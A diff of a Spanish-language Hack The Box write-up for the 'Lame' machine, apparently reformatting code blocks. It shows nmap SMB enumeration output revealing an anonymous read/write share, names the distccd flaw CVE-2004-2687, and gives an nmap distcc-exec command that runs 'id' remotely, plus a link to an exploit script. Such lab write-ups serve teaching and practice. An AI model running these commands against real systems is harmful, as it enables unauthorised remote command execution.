@@ -59,7 +59,8 @@ Host script results:
 
 Vamos a obtener más información de los servicios samba.
 NMAP cuenta con scripts, para realizar una enumeración de samba.
-`kali@kali:\~/HTB/lame/paper$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3 -Pn
+```
+kali@kali:\~/HTB/lame/paper$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3 -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 15:15 EDT
 Nmap scan report for 10.10.10.3
 Host is up (0.10s latency).
@@ -105,7 +106,8 @@ Host script results:
 |     Max Users: <unlimited>
 |     Path: C:\\tmp
 |_    Anonymous access: READ/WRITE
-|_smb-enum-users: ERROR: Script execution failed (use -d to debug)`
+|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
+```
 Podemos intentar acceder con smbclient, a algunos de los directorios listamos con los scripts de Nmap.
 Pero no vemos nada relevante.
 Por último nos queda el puerto distccd v1, volvemos a usar la herramienta nmap, y sus buenos scripts.
@@ -117,7 +119,7 @@ Por último nos queda el puerto distccd v1, volvemos a usar la herramienta nmap,
 Descubrimos la vulnerabilidad CVE-2004-2687,está vulnerabilidad tiene una gravedad de rango ALTO, y nos permitiría ejecutar comandos de manera remota.
 Podemos hacer uso de este código
 `nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"`
-O podemos hacer uso de este [script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
+O podemos hacer uso de este [script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855), es nuestro caso, será el que usemos.
 
 # Explotación
 
